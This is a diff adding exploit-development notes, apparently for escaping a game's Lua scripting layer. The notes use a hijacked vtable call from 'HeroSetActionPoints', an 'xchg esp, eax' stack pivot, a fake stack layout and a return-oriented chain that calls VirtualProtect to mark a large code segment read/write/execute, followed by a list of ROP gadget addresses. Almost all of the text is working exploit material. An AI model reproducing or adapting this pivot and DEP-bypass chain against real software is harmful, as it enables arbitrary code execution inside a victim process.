@@ -1,0 +1,77 @@
+call via modified vtable
+
+hookBase: 0A20000h
+
+
+
+HeroSetActionPoints @4D9087
+	mov esi, lua_arg2
+	call [edx (vtable) + 40h] = call 4020E6, ret @4D90CB
+
+@4020E6
+	push 7D03
+	push 0
+	call esi = call 72B479, ret @4020EF
+
+@72B479
+	xchg esp, eax
+	pop edi
+	ret
+	
+	
+
+fake stack:
+	402100h (fake vtable) -> edi
+	40FCB5h
+	eID
+	58A6CFh REPLACED with original ESP!!
+	...
+	47179Dh jmp [eax] = jmp dword [hookBase]
+	A20000h <= esp at payload run
+	src
+	size
+
+
+actual stack:
+	4020EF <- esp saved to eax, 
+	0
+	7F03
+	4D90CB
+
+
+
+virtualProtect double pivot:
+		dd 72B479h		;xchg eax, esp ; pop edi ; test dword ptr [eax], eax ; ret
+		
+@eax:	dd dummy
+		dd 40142Bh          ; pop eax ; ret
+        dd virtualProtect
+        dd 48A71Bh          ; call [eax] ; ret
+        dd 401000h      ;D start of segment 
+        dd 64B000h      ;D length
+        dd 40h          ;D new access: R/W/X
+        dd 856A28h      ;D dummy ptr, old permissions
+		dd 40142Bh          ; pop eax ; ret
+        dd esp_back
+        dd 72B479h			;xchg eax, esp ; pop edi ; test dword ptr [eax], eax ; ret
+		
+0x0042e17f : mov dword ptr [eax + 4], ecx ; ret
+0x00490654 : mov dword ptr [eax + 8], ecx ; ret
+0x004848d0 : mov dword ptr [eax + 0xc], ecx ; ret
+0x004961c8 : mov dword ptr [eax + 0x10], ecx ; ret
+0x00484c5d : mov dword ptr [eax + 0x14], ecx ; ret
+0x00484cd6 : mov dword ptr [eax + 0x18], ecx ; ret
+0x0040740d : mov dword ptr [eax + 0x1c], ecx ; ret
+0x0040235f : mov dword ptr [eax + 0x20], ecx ; ret
+0x004b92c5 : mov dword ptr [eax + 0x24], ecx ; ret
+0x004493d5 : mov dword ptr [eax + 0x28], ecx ; ret
+0x004f8dde : mov dword ptr [eax + 0x2c], ecx ; ret
+0x005d9d03 : mov dword ptr [eax + 0x30], ecx ; ret
+
+0x0040bb30 : add eax, 0x30 ; ret
+
+: mov dword ptr [eax + 0x14], ecx ; ret
+0x0040235f : mov dword ptr [eax + 0x20], ecx ; ret
+
+0x00595842 : add eax, esp ; pop edi ; js 0x59584c ; ret
+0x0051296e : xor edi, esp ; push ecx ; push edx ; ret 4
